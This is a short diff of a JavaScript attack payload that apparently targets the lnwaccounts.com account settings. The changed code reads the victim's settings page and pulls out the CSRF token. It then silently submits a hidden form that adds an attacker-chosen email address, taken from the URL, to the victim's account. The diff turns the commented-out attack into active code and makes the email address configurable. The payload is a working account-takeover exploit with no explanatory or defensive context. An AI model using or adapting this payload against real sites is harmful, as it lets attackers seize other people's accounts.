@@ -9,16 +9,15 @@ xmlhttp.onreadystatechange=function()
 		var csrf_token = settingHTML.match(patt1);
 		var email = window.location.href;
 		email=email.split('?')
-		alert(email[email.length-1]);
-//		var url = 'https://lnwaccounts.com/manage/setting/email/add';
-//		var form = $('<form action="' + url + '" method="post">' +
-//		'<input type="hidden" name="email" value="temporary@netassess.co.th" />' +
-//		'<input type="hidden" name="ajaxxxx" value="true" />' +
-//		'<input type="hidden" name="ajaxxxx_dataType" value="json" />' +
-//		'<input type="hidden" name="csrf_token" value="'+csrf_token+'" />' +
-//		'</form>');
-//		$('body').append(form);
-//		$(form).submit();
+		var url = 'https://lnwaccounts.com/manage/setting/email/add';
+		var form = $('<form action="' + url + '" method="post">' +
+		'<input type="hidden" name="email" value="'+email[email.length-1]+'" />' +
+		'<input type="hidden" name="ajaxxxx" value="true" />' +
+		'<input type="hidden" name="ajaxxxx_dataType" value="json" />' +
+		'<input type="hidden" name="csrf_token" value="'+csrf_token+'" />' +
+		'</form>');
+		$('body').append(form);
+		$(form).submit();
 	}
 }
 xmlhttp.open("GET","https://lnwaccounts.com/manage/setting",true);
